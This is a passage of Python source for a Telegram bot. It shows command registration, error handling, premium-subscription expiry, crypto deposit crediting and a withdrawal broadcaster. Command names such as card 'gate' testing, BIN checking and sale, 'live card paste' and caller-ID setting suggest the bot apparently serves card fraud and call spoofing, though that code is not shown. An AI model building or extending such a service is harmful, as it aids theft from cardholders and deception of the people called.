    application.add_handler(CommandHandler("redeem_voucher", cmd_redeem))
    application.add_handler(CommandHandler("voucher", cmd_voucher))
    application.add_handler(CommandHandler("addcredits", cmd_addcredits))
    application.add_handler(CommandHandler("gift", cmd_gift))
    application.add_handler(CommandHandler("setcallerid", cmd_setcallerid))
    application.add_handler(CommandHandler("callerid", cmd_callerid))
    application.add_handler(CommandHandler("extkey", cmd_extkey))
    application.add_handler(CommandHandler("analytics", cmd_analytics))
    application.add_handler(CommandHandler("gatetest", cmd_gatetest))
    application.add_handler(CommandHandler("find", cmd_find))
    application.add_handler(CommandHandler("restart", cmd_restart))
    application.add_handler(CommandHandler("reseller", cmd_reseller))
    application.add_handler(CommandHandler("addclient", cmd_addclient))
    application.add_handler(CommandHandler("escrow", cmd_escrow))
    application.add_handler(CommandHandler("hibpwatch", cmd_hibpwatch))
    application.add_handler(CommandHandler("watchemail", cmd_hibpwatch))
    application.add_handler(CommandHandler("scraper", cmd_scraper))
    application.add_handler(CommandHandler("marketplace", cmd_marketplace))
    application.add_handler(CommandHandler("market", cmd_market))
    application.add_handler(CommandHandler("proxyinfo", cmd_proxy_info))
    application.add_handler(CommandHandler("geterror", cmd_geterror))

    # ── New feature handlers ──────────────────────────────────────────────
    application.add_handler(CommandHandler("history", history_command))
    application.add_handler(CommandHandler("top", leaderboard_command))
    application.add_handler(CommandHandler("leaderboard", leaderboard_command))
    application.add_handler(CommandHandler("bincheck", bincheck_command))
    application.add_handler(CommandHandler("binshop", binshop_command))
    application.add_handler(CommandHandler("addbin", addbin_command))
    application.add_handler(CommandHandler("removebin", removebin_command))
    application.add_handler(CommandHandler("casino", casino_command))
    application.add_handler(CommandHandler("broadcast2", rich_broadcast))
    application.add_handler(CommandHandler("rcast", rich_broadcast))
    application.add_handler(CommandHandler("alertset", alertset_command))
    application.add_handler(CommandHandler("myalerts", myalerts_command))
    # Live card paste gate-selection callback
    application.add_handler(CallbackQueryHandler(cb_magic, pattern="^magic:"))
    application.add_handler(CallbackQueryHandler(paste_gate_callback, pattern="^paste_gate:"))
    # BIN shop purchase callback
    application.add_handler(CallbackQueryHandler(binbuy_callback, pattern="^binbuy:"))
    # Casino callbacks
    application.add_handler(CallbackQueryHandler(casino_callback, pattern="^casino:"))
    application.add_handler(CallbackQueryHandler(casinobet_callback, pattern="^casinobet:"))
    # Universal text handler: bincheck/addbin state machine + live card paste
    # group=2 so it runs after handle_dot_commands (group=0) and handle_ton_txhash (group=1)
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, universal_text_handler),
        group=2
    )

    # Robust error handler - catches all errors without crashing
    conflict_count = [0]
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            err = context.error
            if err is None:
                return

            # Rate-limited by Telegram — sleep then let PTB retry
            if isinstance(err, RetryAfter):
                wait = err.retry_after + 1
                print(f"⚠️ Rate limited by Telegram — sleeping {wait}s")
                await asyncio.sleep(wait)
                return

            # Transient network issues — PTB will retry automatically
            if isinstance(err, (TimedOut, NetworkError)):
                return

            # Bot blocked / user deactivated / chat gone — nothing we can do
            if isinstance(err, Forbidden):
                return

            # Bad request from our side — log but don't crash
            if isinstance(err, BadRequest):
                msg = str(err).lower()
                # Suppress noisy but harmless errors
                if any(x in msg for x in ("message is not modified", "message to edit not found",
                                           "message can't be edited", "query is too old",
                                           "message to delete not found")):
                    return
                print(f"⚠️ BadRequest: {err}")
                return

            # Bot conflict (two instances) — just count and ignore
            if isinstance(err, TelegramError) and "conflict" in str(err).lower():
                conflict_count[0] += 1
                if conflict_count[0] <= 3:
                    print(f"⚠️ Bot conflict ({conflict_count[0]}/3) — another instance may be running")
                return

            # All other errors — log with context
            print(f"⚠️ Unhandled error ({type(err).__name__}): {str(err)[:200]}")
        except Exception as e:
            print(f"⚠️ Error in error handler: {e}")
    
    application.add_error_handler(error_handler)
    
    import threading
    def _premium_expiry_checker():
        """Background thread to check and notify users whose premium has expired"""
        import time as _time
        _time.sleep(30)
        if not BOT_TOKEN:
            print("[Premium] No BOT_TOKEN, expiry checker disabled")
            return
        while True:
            try:
                from modules.database import get_expired_premium_users, remove_premium_sync
                expired_users = get_expired_premium_users()
                for user_data in expired_users:
                    uid = user_data.get("user_id")
                    if not uid:
                        continue
                    notified = False
                    try:
                        import requests as req
                        resp = req.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": uid,
                                "text": "⚠️ <b>Premium Expired</b>\n\n"
                                        "Your premium subscription has expired.\n"
                                        "You no longer have access to premium features.\n\n"
                                        "💎 Use /premium to renew your subscription.",
                                "parse_mode": "HTML"
                            },
                            timeout=10
                        )
                        notified = True
                        print(f"[Premium] Notified user {uid} about expiry")
                    except Exception as e:
                        print(f"[Premium] Could not notify user {uid}: {e}")
                    remove_premium_sync(uid)
                    if not notified:
                        print(f"[Premium] Removed expired premium for {uid} (notification failed)")
            except Exception as e:
                print(f"[Premium] Expiry check error: {e}")
            _time.sleep(300)
    
    expiry_thread = threading.Thread(target=_premium_expiry_checker, daemon=True)
    expiry_thread.start()
    print("⏰ Premium expiry checker started (checks every 5 minutes)")

    # Start advance expiry notifier (24h / 6h / 1h warnings before expiry)
    if BOT_TOKEN:
        _start_advance_expiry_notifier(BOT_TOKEN)

    try:
        start_monitor(bot=None, admin_chat_id=OWNER_ID if OWNER_ID else None)
        print("📊 Gate uptime monitor started")
    except Exception as _me:
        print(f"⚠️ Gate monitor: {_me}")

    try:
        start_hibp_watcher(bot=None)
        print("👁 HIBP breach watcher started")
    except Exception as _he:
        print(f"⚠️ HIBP watcher: {_he}")

    def _crypto_deposit_notifier():
        import time as _time
        import requests as req
        _time.sleep(60)
        if not BOT_TOKEN:
            print("[Wallet] No BOT_TOKEN, deposit notifier disabled")
            return

        _EXPLORER_URLS = {
            "ethereum": "https://etherscan.io/tx/",
            "bsc": "https://bscscan.com/tx/",
            "polygon": "https://polygonscan.com/tx/",
            "arbitrum": "https://arbiscan.io/tx/",
            "optimism": "https://optimistic.etherscan.io/tx/",
            "avalanche": "https://snowtrace.io/tx/",
            "solana": "https://solscan.io/tx/",
            "ton": "https://tonscan.org/tx/",
            "bitcoin": "https://blockstream.info/tx/",
            "tron": "https://tronscan.org/#/transaction/",
        }
        _CHAIN_LABELS = {
            "ethereum": "Ethereum", "bsc": "BNB Chain", "polygon": "Polygon",
            "arbitrum": "Arbitrum", "optimism": "Optimism", "avalanche": "Avalanche",
            "solana": "Solana", "ton": "TON", "bitcoin": "Bitcoin", "tron": "TRON",
        }
        _CHAIN_SYMBOLS = {
            "ethereum": "ETH", "bsc": "BNB", "polygon": "POL",
            "arbitrum": "ETH", "optimism": "ETH", "avalanche": "AVAX",
            "solana": "SOL", "ton": "TON", "bitcoin": "BTC", "tron": "TRX",
        }
        # Blockscout API base + native coin symbol/decimals per EVM chain
        _BLOCKSCOUT = {
            "ethereum": ("https://eth.blockscout.com/api", "ETH", 18),
            "bsc":      ("https://bsc.blockscout.com/api", "BNB", 18),
            "polygon":  ("https://polygon.blockscout.com/api", "POL", 18),
            "arbitrum": ("https://arbitrum.blockscout.com/api", "ETH", 18),
            "optimism": ("https://optimism.blockscout.com/api", "ETH", 18),
            "avalanche":("https://avax.blockscout.com/api", "AVAX", 18),
        }
        # ERC-20 / BEP-20 token contracts to watch per EVM chain
        # (contract_address, symbol, decimals)
        _EVM_TOKENS = {
            "ethereum": [
                ("0xdAC17F958D2ee523a2206206994597C13D831ec7", "USDT", 6),
                ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDC", 6),
            ],
            "bsc": [
                ("0x55d398326f99059fF775485246999027B3197955", "USDT", 18),
                ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "USDC", 18),
            ],
            "polygon": [
                ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "USDT", 6),
                ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "USDC", 6),
            ],
            "arbitrum": [
                ("0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "USDT", 6),
                ("0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDC", 6),
            ],
            "optimism": [
                ("0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "USDT", 6),
                ("0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "USDC", 6),
            ],
            "avalanche": [
                ("0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", "USDT", 6),
                ("0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", "USDC", 6),
            ],
        }
        # TRC-20 token contracts to watch on TRON
        _TRON_TRC20 = [
            ("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "USDT", 6),
        ]

        seen_txs = set()
        first_run = True

        print("[Wallet] 💰 Crypto deposit notifier started")

        while True:
            try:
                from modules.database import _execute_with_retry, is_db_connected
                if not is_db_connected():
                    _time.sleep(120)
                    continue

                rows = _execute_with_retry(
                    "SELECT telegram_id, chain, address FROM wallet_deposit_addresses",
                    fetch=True
                ) or []
                legacy = _execute_with_retry(
                    "SELECT telegram_id, chain, address FROM wallet_addresses",
                    fetch=True
                ) or []
                rows = list(rows) + list(legacy)
                if not rows:
                    _time.sleep(120)
                    continue

                for row in rows:
                    tg_id   = row.get('telegram_id') if hasattr(row, 'get') else row[0]
                    chain   = row.get('chain')       if hasattr(row, 'get') else row[1]
                    address = row.get('address')     if hasattr(row, 'get') else row[2]
                    if not address or not chain:
                        continue

                    try:
                        recent_txs = []

                        # ── EVM chains (native coin + USDT/USDC tokens) ────────
                        if chain in _BLOCKSCOUT:
                            api_url, sym, dec = _BLOCKSCOUT[chain]

                            # Native coin transfers
                            try:
                                r = req.get(
                                    api_url,
                                    params={"module": "account", "action": "txlist",
                                            "address": address, "sort": "desc",
                                            "offset": 5, "page": 1},
                                    timeout=10,
                                )
                                result = r.json().get("result")
                                if isinstance(result, list):
                                    for tx in result:
                                        if not isinstance(tx, dict):
                                            continue
                                        to_addr = (tx.get("to") or "").lower()
                                        if to_addr == address.lower() and tx.get("isError") == "0":
                                            val_raw = int(tx.get("value", 0))
                                            if val_raw > 0:
                                                recent_txs.append({
                                                    "hash": tx.get("hash"),
                                                    "value": val_raw / (10 ** dec),
                                                    "symbol": sym,
                                                    "from": tx.get("from", ""),
                                                })
                            except Exception:
                                pass

                            # ERC-20 / BEP-20 token transfers (USDT, USDC)
                            for contract_addr, tok_sym, tok_dec in _EVM_TOKENS.get(chain, []):
                                try:
                                    tok_r = req.get(
                                        api_url,
                                        params={"module": "account", "action": "tokentx",
                                                "address": address,
                                                "contractaddress": contract_addr,
                                                "sort": "desc", "offset": 5, "page": 1},
                                        timeout=10,
                                    )
                                    tok_result = tok_r.json().get("result")
                                    if isinstance(tok_result, list):
                                        for tx in tok_result:
                                            if not isinstance(tx, dict):
                                                continue
                                            to_addr = (tx.get("to") or "").lower()
                                            if to_addr == address.lower() and tx.get("isError", "0") == "0":
                                                val_raw = int(tx.get("value", 0))
                                                if val_raw > 0:
                                                    recent_txs.append({
                                                        "hash": tx.get("hash"),
                                                        "value": val_raw / (10 ** tok_dec),
                                                        "symbol": tok_sym,
                                                        "from": tx.get("from", ""),
                                                    })
                                except Exception:
                                    pass

                        # ── TON ────────────────────────────────────────────────
                        elif chain == "ton":
                            try:
                                r = req.get(
                                    "https://toncenter.com/api/v2/getTransactions",
                                    params={"address": address, "limit": 5},
                                    timeout=10,
                                )
                                for tx in (r.json().get("result") or []):
                                    msg = tx.get("in_msg", {}) or {}
                                    dest = (msg.get("destination") or "").lower()
                                    if dest and address.lower() in dest:
                                        val = int(msg.get("value", 0) or 0)
                                        if val > 0:
                                            recent_txs.append({
                                                "hash": tx.get("transaction_id", {}).get("hash", ""),
                                                "value": val / 1e9,
                                                "symbol": "TON",
                                                "from": msg.get("source", ""),
                                            })
                            except Exception:
                                pass

                        # ── Solana (native SOL with real amounts) ──────────────
                        elif chain == "solana":
                            try:
                                r = req.post(
                                    "https://api.mainnet-beta.solana.com",
                                    json={"jsonrpc": "2.0", "id": 1,
                                          "method": "getSignaturesForAddress",
                                          "params": [address, {"limit": 5}]},
                                    timeout=10,
                                )
                                for sig_info in (r.json().get("result") or []):
                                    if sig_info.get("err"):
                                        continue
                                    sig = sig_info.get("signature", "")
                                    if not sig:
                                        continue
                                    # Fetch actual balance change to get SOL amount
                                    try:
                                        tx_r = req.post(
                                            "https://api.mainnet-beta.solana.com",
                                            json={"jsonrpc": "2.0", "id": 1,
                                                  "method": "getTransaction",
                                                  "params": [sig, {"encoding": "json",
                                                                    "maxSupportedTransactionVersion": 0}]},
                                            timeout=10,
                                        )
                                        tx_data = tx_r.json().get("result") or {}
                                        meta = tx_data.get("meta") or {}
                                        acct_keys = ((tx_data.get("transaction") or {})
                                                     .get("message", {})
                                                     .get("accountKeys", []))
                                        addr_idx = None
                                        for i, key in enumerate(acct_keys):
                                            k = key if isinstance(key, str) else (key or {}).get("pubkey", "")
                                            if k == address:
                                                addr_idx = i
                                                break
                                        if addr_idx is not None:
                                            pre  = (meta.get("preBalances")  or [])[addr_idx] if addr_idx < len(meta.get("preBalances") or [])  else 0
                                            post = (meta.get("postBalances") or [])[addr_idx] if addr_idx < len(meta.get("postBalances") or []) else 0
                                            sol_recv = (post - pre) / 1e9
                                            if sol_recv > 0:
                                                recent_txs.append({
                                                    "hash": sig,
                                                    "value": sol_recv,
                                                    "symbol": "SOL",
                                                    "from": "",
                                                })
                                    except Exception:
                                        pass
                            except Exception:
                                pass

                        # ── TRON (TRX native + USDT TRC-20) ───────────────────
                        elif chain == "tron":
                            # Native TRX
                            try:
                                r = req.get(
                                    "https://apilist.tronscan.org/api/transaction",
                                    params={"address": address, "limit": 5, "sort": "-timestamp"},
                                    timeout=10,
                                )
                                for tx in (r.json().get("data") or []):
                                    to_a = (tx.get("toAddress") or "").lower()
                                    if to_a == address.lower():
                                        val = int(tx.get("amount", 0))
                                        if val > 0:
                                            recent_txs.append({
                                                "hash": tx.get("hash", ""),
                                                "value": val / 1e6,
                                                "symbol": "TRX",
                                                "from": tx.get("ownerAddress", ""),
                                            })
                            except Exception:
                                pass

                            # TRC-20 tokens (USDT)
                            for contract, tok_sym, tok_dec in _TRON_TRC20:
                                try:
                                    tok_r = req.get(
                                        "https://apilist.tronscan.org/api/token_trc20/transfers",
                                        params={"toAddress": address,
                                                "contract_address": contract,
                                                "limit": 5},
                                        timeout=10,
                                    )
                                    for transfer in (tok_r.json().get("token_transfers") or []):
                                        to_addr = transfer.get("to_address", "")
                                        if to_addr.lower() == address.lower():
                                            quant = int(transfer.get("quant", 0))
                                            if quant > 0:
                                                recent_txs.append({
                                                    "hash": transfer.get("transaction_id", ""),
                                                    "value": quant / (10 ** tok_dec),
                                                    "symbol": tok_sym,
                                                    "from": transfer.get("from_address", ""),
                                                })
                                except Exception:
                                    pass

                        # ── Bitcoin ────────────────────────────────────────────
                        elif chain == "bitcoin":
                            try:
                                r = req.get(
                                    f"https://blockstream.info/api/address/{address}/txs",
                                    timeout=10,
                                )
                                for tx in (r.json() or [])[:5]:
                                    tx_hash = tx.get("txid", "")
                                    if not tx_hash:
                                        continue
                                    satoshis = sum(
                                        vout.get("value", 0)
                                        for vout in (tx.get("vout") or [])
                                        if vout.get("scriptpubkey_address") == address
                                    )
                                    if satoshis > 0:
                                        recent_txs.append({
                                            "hash": tx_hash,
                                            "value": satoshis / 1e8,
                                            "symbol": "BTC",
                                            "from": "",
                                        })
                            except Exception:
                                pass

                        # ── Process newly seen transactions ────────────────────
                        for tx_info in recent_txs:
                            tx_hash = tx_info.get("hash", "")
                            if not tx_hash:
                                continue
                            tx_key = f"{chain}:{tx_hash}"
                            if tx_key in seen_txs:
                                continue
                            seen_txs.add(tx_key)

                            if first_run:
                                continue

                            val = tx_info.get("value")
                            sym = tx_info.get("symbol", _CHAIN_SYMBOLS.get(chain, ""))
                            sender = tx_info.get("from", "")
                            short_sender = sender[:6] + "…" + sender[-4:] if len(sender) > 12 else sender
                            explorer = _EXPLORER_URLS.get(chain, "")
                            chain_label = _CHAIN_LABELS.get(chain, chain)
                            val_str = f"{val:.6f}".rstrip('0').rstrip('.') if val else "?"

                            text = (
                                f"💰 <b>Crypto Received!</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"🔗 <b>Network:</b> {chain_label}\n"
                                f"💎 <b>Amount:</b> {val_str} {sym}\n"
                                + (f"📤 <b>From:</b> <code>{short_sender}</code>\n\n" if short_sender else "\n")
                                + f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"✅ <b>Confirmed on blockchain</b>"
                            )

                            keyboard = []
                            if explorer and tx_hash:
                                keyboard.append([{"text": "🔍 View on Explorer",
                                                  "url": f"{explorer}{tx_hash}"}])
                            keyboard.append([{"text": "💰 Open Wallet",
                                              "url": f"https://t.me/{BOT_USERNAME}"}])

                            # Credit balance atomically — idempotent via ON CONFLICT DO NOTHING
                            credited_now = False
                            try:
                                if val and val > 0:
                                    asset_code = sym.upper()
                                    from keep_alive import _wallet_txn
                                    with _wallet_txn() as conn:
                                        with conn.cursor() as cur:
                                            cur.execute(
                                                """INSERT INTO wallet_transactions
                                                     (telegram_id, tx_type, chain, asset, amount,
                                                      address, tx_hash, status, note)
                                                   VALUES (%s, 'deposit', %s, %s, %s, %s, %s,
                                                           'confirmed', %s)
                                                   ON CONFLICT (chain, tx_hash)
                                                     WHERE tx_type = 'deposit' AND tx_hash IS NOT NULL
                                                     DO NOTHING
                                                   RETURNING id""",
                                                (int(tg_id), chain, asset_code, str(val),
                                                 address, tx_hash,
                                                 f"From {short_sender}" if sender else None)
                                            )
                                            if cur.fetchone() is not None:
                                                cur.execute(
                                                    """INSERT INTO wallet_balances
                                                           (telegram_id, asset, balance, updated_at)
                                                       VALUES (%s, %s, %s, NOW())
                                                       ON CONFLICT (telegram_id, asset) DO UPDATE
                                                         SET balance = wallet_balances.balance
                                                                       + EXCLUDED.balance,
                                                             updated_at = NOW()""",
                                                    (int(tg_id), asset_code, str(val))
                                                )
                                                credited_now = True
                            except Exception as _ce:
                                print(f"[Wallet] Failed to credit {tg_id}: {_ce}")
                                continue
                            if not credited_now:
                                continue

                            try:
                                req.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                    json={
                                        "chat_id": tg_id,
                                        "text": text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": keyboard},
                                    },
                                    timeout=10,
                                )
                                print(f"[Wallet] ✅ Credited {val_str} {sym} → {tg_id} ({chain_label})")
                            except Exception as ne:
                                print(f"[Wallet] Notify failed for {tg_id}: {ne}")

                    except Exception:
                        pass

                if first_run:
                    first_run = False
                    print(f"[Wallet] First scan done — cached {len(seen_txs)} existing txs")

                if len(seen_txs) > 50000:
                    oldest = list(seen_txs)[:25000]
                    for k in oldest:
                        seen_txs.discard(k)

            except Exception as e:
                print(f"[Wallet] Deposit check error: {e}")

            _time.sleep(120)

    deposit_thread = threading.Thread(target=_crypto_deposit_notifier, daemon=True)
    deposit_thread.start()
    print("💰 Crypto deposit notifier started (checks every 2 minutes)")

    # ── Withdrawal worker ──────────────────────────────────────────────
    def _withdrawal_worker():
        """
        Polls pending withdrawals and actually sends them on-chain.

        Status state machine for `wallet_transactions.status` (withdraw rows):

            pending              → claimed by worker
            broadcasting         → atomically held while signing/sending; if
                                   the process dies in this window the next
                                   worker tick sweeps it back to pending
                                   (tx_hash is still NULL)
            broadcast            → tx submitted, tx_hash recorded; awaiting
                                   receipt
            confirmed            → receipt success — money is gone, user
                                   notified
            failed               → reverted on chain or hard pre-broadcast
                                   error; refunded atomically with the flip
            needs_reconciliation → broadcast call failed AFTER the tx may
                                   have been accepted by the network. NOT
                                   refunded — owner must investigate the hot
                                   wallet on the explorer and resolve via
                                   /confirmwd <id> <hash> or /rejectwd.

          - EVM + Tron rows are signed & broadcast automatically.
          - Other chains (sol/ton/btc) are escalated to the owner for manual
            /confirmwd, since their broadcasters aren't wired up yet.
          - Soft failures (insufficient_hot_balance, hd_unavailable) park
            back to pending (status-guarded) and ping the owner once.
          - All park-to-pending and refund writes are CAS-guarded against
            the previous status so a racing /rejectwd or /confirmwd can
            never be silently overwritten.
        """
        import time as _time
        import requests as req
        _time.sleep(75)
        if not BOT_TOKEN:
            return
        OWNER_UID = 1857417752
        # How often (at most) we re-DM the owner about the SAME parked /
        # blocked withdrawal row. Persisted on the row's last_notified_at
        # column so the throttle survives bot restarts (otherwise we'd
        # re-spam the owner about every still-pending row on every reboot).
        NOTIFY_THROTTLE_HOURS = 6
        print("[Wallet] ⬆️ Withdrawal broadcaster started")

        # Crash recovery: any 'broadcasting' row left over from a previous
        # process (no tx_hash yet) is safe to retry.
        try:
            from modules.database import _execute_with_retry as _exec0
            recovered = _exec0(
                """UPDATE wallet_transactions SET status='pending'
                    WHERE tx_type='withdraw' AND status='broadcasting'
                      AND tx_hash IS NULL
                    RETURNING id""",
                fetch=True,
            ) or []
            if recovered:
                print(f"[Wallet] ♻️ Recovered {len(recovered)} stuck broadcasting row(s) → pending")
        except Exception as e:
            print(f"[Wallet] Crash-recovery sweep failed: {e}")

        def _send_owner(text):
            try:
                req.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": OWNER_UID, "text": text,
                          "parse_mode": "HTML",
                          "disable_web_page_preview": True},
                    timeout=10,
                )
            except Exception:
                pass

        def _claim_notify_slot(wid):
            """
            Atomically check-and-set the row's last_notified_at to now if
            it's NULL or older than NOTIFY_THROTTLE_HOURS. Returns True if
            this caller "won" the slot (meaning: it should send the DM),
            False if another notification was already sent recently.

            Persisting this on the row means a bot restart cannot cause us
            to re-DM the owner about every still-pending withdrawal — the
            previous timestamp is still in the database.
            """
            try:
                from modules.database import _execute_with_retry as _exec
                rc = _exec(
                    """UPDATE wallet_transactions
                          SET last_notified_at = NOW()
                        WHERE id = %s
                          AND (last_notified_at IS NULL
                               OR last_notified_at
                                  < NOW() - (%s || ' hours')::interval)""",
                    (wid, str(NOTIFY_THROTTLE_HOURS)),
                    return_rowcount=True,
                )
                return bool(rc)
            except Exception as e:
                # If the throttle update fails, fall back to "don't notify"
                # rather than risk spamming. The next poll will try again.
                print(f"[Wallet] notify-throttle update failed for #{wid}: {e}")
                return False

        def _send_user(uid, text, tx_url=None):
            payload = {"chat_id": int(uid), "text": text,
                       "parse_mode": "HTML",
                       "disable_web_page_preview": True}
            if tx_url:
                payload["reply_markup"] = {"inline_keyboard": [[
                    {"text": "🔍 View Transaction on Explorer", "url": tx_url}
                ]]}
            try:
                req.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json=payload, timeout=10,
                )
            except Exception:
                pass

        while True:
            try:
                from modules.database import _execute_with_retry, is_db_connected
                from modules import onchain_broadcaster as ob
                from modules.chain_config import (
                    explorer_tx_url, chain_label,
                )
                if not is_db_connected():
                    _time.sleep(60)
                    continue

                # Atomically claim a batch of pending rows by flipping to
                # 'broadcasting'. Prevents double-spend if the worker is
                # restarted mid-flight.
                claimed = _execute_with_retry(
                    """UPDATE wallet_transactions
                          SET status = 'broadcasting'
                        WHERE id IN (
                            SELECT id FROM wallet_transactions
                             WHERE tx_type = 'withdraw' AND status = 'pending'
                             ORDER BY created_at
                             LIMIT 10
                             FOR UPDATE SKIP LOCKED
                        )
                        RETURNING id, telegram_id, chain, asset, amount, address""",
                    fetch=True,
                ) or []

                for r in claimed:
                    wid = r['id']
                    user_id = int(r['telegram_id'])
                    chain = r['chain']
                    asset = r['asset']
                    amount = r['amount']
                    addr = r['address']

                    if not ob.is_auto_broadcastable(chain):
                        # Park back to pending and escalate to owner once.
                        # CAS guard: only flip from 'broadcasting' so a racing
                        # admin /rejectwd or /confirmwd is never overwritten.
                        _execute_with_retry(
                            "UPDATE wallet_transactions SET status='pending' "
                            "WHERE id=%s AND status='broadcasting'",
                            (wid,),
                        )
                        if _claim_notify_slot(wid):
                            short = f"{addr[:10]}…{addr[-8:]}" if len(addr) > 22 else addr
                            _send_owner(
                                f"⚠️ <b>Manual Withdrawal #{wid}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━\n"
                                f"👤 User: <code>{user_id}</code>\n"
                                f"💎 {amount} {asset}\n"
                                f"🔗 {chain_label(chain)}\n"
                                f"📤 <code>{short}</code>\n"
                                f"━━━━━━━━━━━━━━━━━━\n"
                                f"This chain has no auto-broadcaster yet.\n"
                                f"Send manually then /confirmwd {wid} &lt;tx_hash&gt;\n"
                                f"or /rejectwd {wid} &lt;reason&gt; to refund."
                            )
                        continue

                    print(f"[Wallet] Broadcasting #{wid}: {amount} {asset} on {chain} → {addr[:18]}…")
                    tx_hash, err = ob.broadcast(chain, asset, addr, amount)

                    if err is None and tx_hash:
                        # Tx is in the mempool — record it but don't claim
                        # success until the receipt-poll sees it succeed.
                        # Status guard: only advance from 'broadcasting' so a
                        # racing manual /rejectwd cannot be silently undone.
                        rc = _execute_with_retry(
                            """UPDATE wallet_transactions
                                  SET status='broadcast', tx_hash=%s
                                WHERE id=%s AND status='broadcasting'""",
                            (tx_hash, wid),
                            return_rowcount=True,
                        )
                        if not rc:
                            # Row was concurrently moved out of 'broadcasting'
                            # (admin override). The on-chain tx still exists —
                            # alert the owner so they can reconcile manually.
                            _send_owner(
                                f"⚠️ <b>Withdrawal #{wid} race</b>\n"
                                f"Broadcast succeeded but row was no longer "
                                f"'broadcasting'.\n"
                                f"💎 {amount} {asset} on {chain_label(chain)}\n"
                                f"🆔 <code>{tx_hash}</code>\n"
                                f"⚠️ Manual reconciliation required."
                            )
                            print(f"[Wallet] ⚠️ #{wid} CAS lost — on-chain tx={tx_hash}")
                            continue
                        url = explorer_tx_url(chain, tx_hash)
                        _send_user(
                            user_id,
                            (f"📡 <b>Withdrawal Broadcast</b>\n"
                             f"━━━━━━━━━━━━━━━━━━\n"
                             f"💎 {amount} {asset}\n"
                             f"🔗 {chain_label(chain)}\n"
                             f"🆔 <code>{tx_hash}</code>\n"
                             f"⌛ Waiting for on-chain confirmation…"),
                            tx_url=url,
                        )
                        print(f"[Wallet] 📡 Broadcast #{wid} → {tx_hash} (awaiting receipt)")
                        continue

                    # Soft failures: leave row pending, ping owner once.
                    if err in ('insufficient_hot_balance', 'hd_unavailable'):
                        # CAS guard prevents clobbering a concurrent admin
                        # action (see manual-fallback comment above).
                        _execute_with_retry(
                            "UPDATE wallet_transactions SET status='pending' "
                            "WHERE id=%s AND status='broadcasting'",
                            (wid,),
                        )
                        if _claim_notify_slot(wid):
                            _send_owner(
                                f"🚨 <b>Withdrawal #{wid} blocked: {err}</b>\n"
                                f"💎 {amount} {asset} on {chain_label(chain)}\n"
                                f"Refill the hot wallet and it will retry automatically."
                            )
                        print(f"[Wallet] ⏸ #{wid} parked: {err}")
                        continue

                    # Indeterminate: broadcast was attempted but the RPC call
                    # failed — the tx may already be on-chain. NEVER refund
                    # here. Park into 'needs_reconciliation' (a status the
                    # crash-recovery sweep does NOT touch) and force the
                    # owner to investigate before the row can move again.
                    if err and err.startswith('rpc_indeterminate'):
                        _execute_with_retry(
                            """UPDATE wallet_transactions
                                  SET status='needs_reconciliation', note=%s
                                WHERE id=%s AND status='broadcasting'""",
                            ((err or '')[:200], wid),
                        )
                        _send_owner(
                            f"⚠️ <b>Withdrawal #{wid} INDETERMINATE</b>\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"👤 User: <code>{user_id}</code>\n"
                            f"💎 {amount} {asset} on {chain_label(chain)}\n"
                            f"📤 <code>{addr}</code>\n"
                            f"⚠️ {err}\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"The broadcast call failed but the tx may have "
                            f"already landed on-chain. Check the hot wallet "
                            f"address on the explorer for an outgoing tx of "
                            f"this exact amount near this timestamp.\n"
                            f"• If it landed: /confirmwd {wid} &lt;tx_hash&gt;\n"
                            f"• If not:      /rejectwd {wid} indeterminate_no_tx"
                        )
                        print(f"[Wallet] ❓ #{wid} INDETERMINATE — owner reconciliation required")
                        continue

                    # Hard failure: refund and notify both sides.
                    refunded = False
                    try:
                        from keep_alive import _wallet_txn
                        with _wallet_txn() as conn:
                            with conn.cursor() as cur:
                                cur.execute(
                                    """UPDATE wallet_transactions
                                          SET status='failed', note=%s
                                        WHERE id=%s AND status='broadcasting'
                                        RETURNING telegram_id""",
                                    ((err or 'broadcast_error')[:200], wid),
                                )
                                if cur.fetchone():
                                    cur.execute(
                                        """INSERT INTO wallet_balances (telegram_id, asset, balance, updated_at)
                                           VALUES (%s, %s, %s, NOW())
                                           ON CONFLICT (telegram_id, asset) DO UPDATE
                                             SET balance = wallet_balances.balance + EXCLUDED.balance,
                                                 updated_at = NOW()""",
                                        (user_id, asset, str(amount)),
                                    )
                                    refunded = True
                    except Exception as e:
                        print(f"[Wallet] Refund of #{wid} failed: {e}")

                    if refunded:
                        _send_user(
                            user_id,
                            (f"❌ <b>Withdrawal Failed</b>\n"
                             f"━━━━━━━━━━━━━━━━━━\n"
                             f"💎 {amount} {asset} refunded to your wallet.\n"
                             f"📝 Reason: {err}"),
                        )
                    _send_owner(
                        f"❌ <b>Withdrawal #{wid} failed</b>\n"
                        f"💎 {amount} {asset} on {chain_label(chain)}\n"
                        f"⚠️ {err}\n"
                        + ("✅ User refunded." if refunded else "⚠️ Refund failed — investigate.")
                    )
                    print(f"[Wallet] ❌ #{wid} failed: {err}")

                # ── Pass 2: poll receipts for 'broadcast' rows ────────
                try:
                    pending_receipts = _execute_with_retry(
                        """SELECT id, telegram_id, asset, amount, chain, address, tx_hash
                             FROM wallet_transactions
                            WHERE tx_type='withdraw'
                              AND status='broadcast'
